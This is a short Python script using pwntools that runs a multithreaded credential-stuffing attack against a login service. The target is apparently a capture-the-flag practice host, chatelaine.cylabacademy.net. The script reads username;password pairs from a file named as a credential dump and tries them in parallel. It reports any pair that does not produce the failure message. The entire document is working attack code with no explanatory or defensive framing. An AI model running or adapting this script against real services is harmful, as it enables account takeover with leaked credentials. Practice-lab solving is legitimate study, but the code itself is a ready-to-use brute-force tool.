#!/usr/bin/env python3
from pwn import *
from threading import Thread, Event
import queue, sys

HOST, PORT   = "chatelaine.cylabacademy.net", 12082
CREDS_FILE   = "creds-dump.txt"
FAIL_STRING  = b"Invalid username or password"
WORKERS      = 15          # raise carefully — the service may rate-limit

context.log_level = "error"
hit = Event()

def attempt(user, pw):
    r = None
    try:
        r = remote(HOST, PORT, timeout=5)
        r.recvuntil(b"Username:", timeout=5)
        r.sendline(user.encode())
        r.recvuntil(b"Password:", timeout=5)
        r.sendline(pw.encode())
        try:
            # fast path: fail line arrives -> immediate miss
            r.recvuntil(FAIL_STRING, timeout=4)
            return False, b""
        except EOFError:
            # fail string never came -> possible success, read the rest
            try:
                resp = r.recvall(timeout=2)
            except Exception:
                resp = b""
            return (FAIL_STRING.lower() not in resp.lower()), resp
    except Exception:
        return False, b""
    finally:
        if r:
            try: r.close()
            except Exception: pass

def worker(q):
    while not hit.is_set():
        try:
            user, pw = q.get_nowait()
        except queue.Empty:
            return
        ok, resp = attempt(user, pw)
        if ok:
            hit.set()
            print(f"\n=== HIT ===\nuser={user}  pass={pw}\n{resp.decode(errors='replace')}")

q = queue.Queue()
with open(CREDS_FILE, "r", errors="ignore") as f:
    for line in f:
        line = line.strip()
        if line and ";" in line:
            u, p = [x.strip() for x in line.split(";", 1)]
            if u and p:
                q.put((u, p))

print(f"queued {q.qsize()} pairs, {WORKERS} workers")
ts = [Thread(target=worker, args=(q,), daemon=True) for _ in range(WORKERS)]
for t in ts: t.start()
for t in ts: t.join()
if not hit.is_set():
    print("no hit")
